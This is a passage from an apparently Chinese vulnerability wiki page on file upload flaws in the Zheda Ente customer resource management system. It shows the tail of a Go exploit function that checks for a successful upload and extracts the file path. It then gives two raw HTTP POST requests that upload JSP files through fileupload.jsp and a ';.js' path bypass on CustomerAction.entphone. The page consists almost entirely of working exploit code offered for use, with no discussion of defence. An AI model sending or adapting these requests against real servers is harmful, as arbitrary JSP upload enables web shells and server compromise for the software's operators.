<span class="w">        </span><span class="nx">do</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">client</span><span class="p">.</span><span class="nx">Do</span><span class="p">(</span><span class="nx">request</span><span class="p">)</span>
<span class="w">        </span><span class="k">defer</span><span class="w"> </span><span class="kd">func</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">_</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">do</span><span class="p">.</span><span class="nx">Body</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
<span class="w">        </span><span class="p">}()</span>
<span class="w">        </span><span class="nx">all</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">ioutil</span><span class="p">.</span><span class="nx">ReadAll</span><span class="p">(</span><span class="nx">do</span><span class="p">.</span><span class="nx">Body</span><span class="p">)</span>
<span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="nx">Resutl</span>
<span class="w">        </span><span class="nx">_</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">json</span><span class="p">.</span><span class="nx">Unmarshal</span><span class="p">(</span><span class="nx">all</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">result</span><span class="p">)</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">Msg</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">&quot;上传成功&quot;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="s">&quot;上传失败了&quot;</span><span class="p">)</span>
<span class="w">                </span><span class="nx">os</span><span class="p">.</span><span class="nx">Exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nx">split</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nx">Split</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">VisitRoot</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;null&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">split</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="p">}</span>
</code></pre></div>
<h2 id="3">文件上传3<a class="headerlink" href="#3" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>POST /entsoft_en/entereditor/jsp/fileupload.jsp?filename=plugins.jsp HTTP/1.1
Host: xxxxxxxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0  uacq
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

1111
</code></pre></div>
<h2 id="4">文件上传4<a class="headerlink" href="#4" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0  uacq
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Length: 203

------WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Disposition: form-data; name=&quot;file&quot;;filename=&quot;as.jsp&quot;
Content-Type: image/jpeg

&lt;%out.print(&quot;test&quot;);%&gt;
------WebKitFormBoundarye8FPHsIAq9JN8j2A--
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FQuotegask_editAction%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FQuotegask_editAction%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        浙大恩特客户资源管理系统Quotegask_editAction存在SQL注入漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-purchaseaction.entphone%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-purchaseaction.entphone%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        浙大恩特客户资源管理系统 purchaseaction.entphone接口存在SQL漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>